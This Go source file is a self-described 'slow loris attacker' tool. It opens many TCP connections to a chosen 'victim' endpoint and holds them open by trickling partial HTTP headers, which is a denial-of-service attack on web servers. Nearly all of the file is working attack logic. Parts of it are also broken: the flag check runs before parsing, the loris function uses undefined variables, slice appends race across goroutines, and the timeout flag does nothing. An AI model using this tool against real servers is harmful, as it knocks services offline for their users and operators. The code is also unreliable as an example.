package main

import (
  "fmt"
  "net"
  "time"
  "flag"
)

type headers struct {
      base          string // base HTTP request string
      general       string // typical HTTP headers
      loris         string // header which will be repeatadly sent
}

type state struct {
      endpoint      string
      delay         int
      numAttackers  int
      timeout       int

}

// struct representing a slow loris attacker
type attacker struct {
      id            int
      conn          net.Conn
}

func main() {
  endpoint := flag.String("endpoint", "", "endpoint which will be victim of slowloris attack")
  delay := flag.Int("delay", 10, "time to wait between writes to specified endpoint")
  // set delay to be at least 5 seconds
  if *delay < 5 {
    *delay = 5
  }
  numAttackers := flag.Int("threads", 10, "number of threads to be dispatched to execute attacks")
  timeout := flag.Int("timeout", 0, "optional timeout (if you want attack to eventually terminate)")
  flag.Parse()

  // exit if no endpoint provided
  if *endpoint == "" {
    fmt.Println("usage: slave -endpoint <url> ...")
    return
  }

  // important state to track about attack
  attackState := &state {
    endpoint:     *endpoint,
    delay:        *delay,
    numAttackers: *numAttackers,
    timeout:      *timeout,
  }

  // important state to track about
  reqHeaders := headers{
    base: "GET / HTTP/1.0\r\n",
    general: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept-language: en-US,en,q=0.5",
    loris: "X-a 1\r\n",
  }

  // display slow loris attack information
  announceAttack(attackState)

  doneChan := make(chan int, attackState.numAttackers)

  // create a swarm of attackers, simple TCP sockets to use
  // to execute slow loris attacks
  swarm := createSwarm(attackState.numAttackers, attackState.endpoint)

  // get base request string as byte array
  baseReq := []byte(reqHeaders.base)

  // dispatch goroutines to start writing from each attacker to server
  for _, atk_i := range swarm {
    go func(atk_i *attacker) {
      if err := writeEndpoint(atk_i.conn, baseReq); err != nil {
        fmt.Println("attacker", atk_i.id, "failed to write to server")
      } else {
        fmt.Println("base header sent by attacker", atk_i.id)
      }
      doneChan<- 1
    }(atk_i)
  }

  // wait on all goroutines to begin writing to server
  for i := 0; i < *numAttackers; i++ {
    <-doneChan
  }

  // dispatch goroutines to initiate attack
  for _, attacker := range swarm {
    go loris(attacker, doneChan, attackState.delay, reqHeaders.loris)
  }

  // wait on all attacks to complete (only when timeout specified)
  for i := 0; i < *numAttackers; i++ {
    <-doneChan
  }
}

func writeEndpoint(conn net.Conn, message []byte) error {
  _, err := conn.Write(message)
  return err
}

func createSwarm(numAttackers int, endpoint string) []*attacker {
  swarm := make([]*attacker, 0)
  // use doneChan to wait on goroutines that create attackers
  doneChan := make(chan int, 0)
  // create specified number of connection sockets, one per attacker
  for i := 0; i < numAttackers; i++ {
    // dispatch goroutines to create each attacker
    go func(i int) {
      conn, err := net.Dial("tcp", endpoint+":http")
      // attempt to establish connection until successful
      for err != nil {
        fmt.Println("failed to establish connection to", endpoint, "trying again now...")
        conn, err = net.Dial("tcp", endpoint+":http")
      }
      fmt.Println("attacker #", i, "created")
      swarm = append(swarm, &attacker{id: i, conn: conn})
      doneChan<- 1
    }(i)
  }

  for i := 0; i < numAttackers; i++ {
    <-doneChan
  }
  fmt.Println("exiting createSwarm")
  return swarm
}

// this function implements the slow loris attack, repeatadly writing to
// a socket to continue
func loris(worker *attacker, doneChan chan int, delay int, header string) {
  for {
    time.Sleep(time.Duration(delay) * time.Second)
    repeatHeader := []byte(header)
    if err := writeEndpoint(worker.conn, repeatHeader); err != nil {
      fmt.Println("error with repeat header")
    } else {
      fmt.Println("loris sent by attacker", worker.id, worker.attacks, "for this worker", total, "total")
    }
  }
  doneChan <- 1
}

// utility function, prints details about attack
func announceAttack(attackState *state) {
  fmt.Println("==========================================")
  fmt.Println("AASHRAY'S SLOW LORIS ATTACKER version 0.1")
  fmt.Println("        VICTIM OF ATTACK:", attackState.endpoint)
  fmt.Println("        NUMBER OF ATTACKERS:", attackState.numAttackers)
  fmt.Println("        DELAY BETWEEN EACH WRITE:", attackState.delay)
  fmt.Println("        TIMEOUT (0 -> NO TIMEOUT):", attackState.timeout)
  fmt.Println("==========================================")
}
